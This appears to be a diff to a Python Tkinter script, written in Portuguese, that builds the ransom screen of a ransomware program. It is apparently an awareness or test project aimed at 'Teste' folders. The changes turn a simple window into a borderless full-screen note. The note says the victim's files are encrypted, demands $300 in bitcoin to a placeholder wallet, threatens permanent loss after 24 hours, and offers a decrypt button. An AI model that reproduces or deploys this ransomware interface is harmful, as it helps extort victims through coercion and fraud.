@@ -4,6 +4,9 @@ import platform
 import tkinter as tk
 from PIL import Image, ImageTk
 import sys
+import tkinter as tk
+from PIL import Image, ImageTk
+import sys
 
 def user_name():
     if os.name == 'posix':
@@ -60,7 +63,7 @@ def identificar_so():
         print(f'Sistema Operacional: {sistema}')
         print(f'Release: {release}')
         nome = user_name()
-        diretorio = f'C:\\Users\\{nome}\\Documents\\Teste'
+        diretorio = f'C:\\Users\\{nome}\\Documentos\\Teste'
 
         
     elif 'Linux' in sistema:
@@ -93,7 +96,7 @@ def on_decrypt_button_click():
         sistema = platform.system()
         nome = user_name()
         if sistema == 'Windows':
-            diretorio_path = f'C:\\Users\\{nome}\\Documents\\Teste'
+            diretorio_path = f'C:\\Users\\{nome}\\Documentos\\Teste'
         elif sistema == 'Linux':
             diretorio_path = f'/home/{nome}/Documentos/teste'
         else:
@@ -111,36 +114,47 @@ def on_decrypt_button_click():
 
 def exibir_conscientizacao():
     janela = tk.Tk()
-    janela.title("Aviso de Conscientização")
-    janela.geometry("1280x800")
-    
-    label = tk.Label(janela, justify="left")
-    label.pack()
-    image_path = os.path.join(os.path.abspath(sys._MEIPASS), "pacote/rans.png")
-    image = Image.open(image_path)
-    image = image.resize((800, 600), Image.LANCZOS)
-    photo = ImageTk.PhotoImage(image)
-    imagem_label = tk.Label(janela, image=photo)
-    imagem_label.image = photo
-    imagem_label.pack()
+    janela.title("Descriptografia")
+    janela.geometry("1920x1080")
+    janela.overrideredirect(True)
 
-    instrucao_label = tk.Label(janela, text="Send $300 worth of bitcoin to this address:")
-    instrucao_label.pack()
+    imagem_fundo = Image.open("/home/vitorkl/Downloads/fundo.jpeg")
+    imagem_fundo = ImageTk.PhotoImage(imagem_fundo)
 
-    endereco_label = tk.Label(janela, text="39279fshdfskbAWEas342ssfe24afgDWhkl2313jnsp$Mw")
-    endereco_label.pack()
+    label_fundo = tk.Label(janela, image=imagem_fundo)
+    label_fundo.place(relwidth=1,relheight=1)
 
-    botao_copy = tk.Button(janela, text="Copy")
-    botao_copy.pack()
+    cadeado = Image.open("/home/vitorkl/Downloads/cadeado.png")
+    cadeado = cadeado.resize((253,274))
+    imagem_cadeado = ImageTk.PhotoImage(cadeado)
 
-    botao_check = tk.Button(janela, text="Check Payment")
-    botao_check.pack(side=tk.LEFT)
+    label_cadeado = tk.Label(janela,image=imagem_cadeado)
+    label_cadeado.place(relx=0.13,rely=0.2,anchor="center")
 
-    botao_decrypt = tk.Button(janela, text="Decrypt", command=on_decrypt_button_click)
-    botao_decrypt.pack(side=tk.RIGHT)
+    titulo_explicacao = tk.Label(janela, bg="black",fg="red", text="Seus arquivos foram criptografados")
+    titulo_explicacao.pack(anchor=tk.CENTER)
 
-    botao_check.place(relx=0.4, rely=0.9, anchor="center")
-    botao_decrypt.place(relx=0.6, rely=0.9, anchor="center")
+    explicacao = tk.Label(janela, bg="black",fg="red", text="para recuperar seus arquivos, você precisa  pagar um resgate de US$ 300 em bitcoin para o seguinte endereço:")
+    explicacao.pack(anchor=tk.CENTER,pady=20)
+
+    carteira = tk.Label(janela, bg="black",fg="red", text="Carteira: 39279fshdfskbAWEas342ssfe24afgDWkl2313jnsp$Mw")
+    carteira.pack(anchor=tk.CENTER,pady=20)
+
+    tempo_pagamento = tk.Label(janela, bg="black",fg="red", text="Você tem 24 horas para pagar o resgate. Caso contrário, seus arquivos serão perididos para sempre")
+    tempo_pagamento.pack(anchor=tk.CENTER,pady=20)
+
+    caixa_explicativa = tk.Text(janela, wrap="word", width=40, height=20, bg="black", fg="red", bd=0)
+    caixa_explicativa.insert(tk.END, """teste teste teste""")
+    caixa_explicativa.place(relx=0.05, rely=0.5, anchor="w")
+
+    botao_copia = tk.Button(janela, bg="black",fg="red", text="Copiar Carteira", command=lambda:'39279fshdfskbAWEas342ssfe24afgDWkl2313jnsp$Mw')
+    botao_copia.pack(anchor=tk.CENTER)
+
+    botao_cancelar = tk.Button(janela, bg="black",fg="red", text="Cancelar", command=lambda: janela.destroy())
+    botao_cancelar.pack(anchor=tk.CENTER)
+
+    botao_descriptografar = tk.Button(janela, bg="black",fg="red", text="Descriptografar", command=lambda: on_decrypt_button_click())
+    botao_descriptografar.pack(anchor=tk.CENTER)
 
     janela.mainloop()
 
